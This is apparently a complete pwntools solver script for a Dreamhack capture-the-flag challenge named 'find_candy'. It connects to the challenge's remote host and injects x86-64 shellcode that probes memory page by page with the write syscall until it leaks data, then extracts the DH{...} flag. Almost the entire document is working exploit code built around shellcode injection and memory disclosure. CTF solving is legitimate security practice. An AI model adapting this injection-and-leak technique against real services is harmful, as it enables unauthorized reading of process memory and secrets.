#!/usr/bin/env python3

from pwn import *
import re

exe = ELF("./find_candy_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 19958)

    return r


def main():
    r = conn()

    shellcode = asm("""
        mov rsi, 0x80000000000
        mov rdi, 1
        mov rdx, 458
    loop:
        mov rax, 1
        syscall

        cmp rax, 0
        jg end

        mov rax, 1
        add rsi, 0x1000
        jmp loop
    end:
        jmp end
    """)
    r.sendafter(b"shellcode: ", shellcode)
    
    treasure = r.recvn(458)

    flag = re.search(b'DH\\{.*?\\}', treasure)
    log.success(f"flag: {flag.group(0)}")

if __name__ == "__main__":
    main()
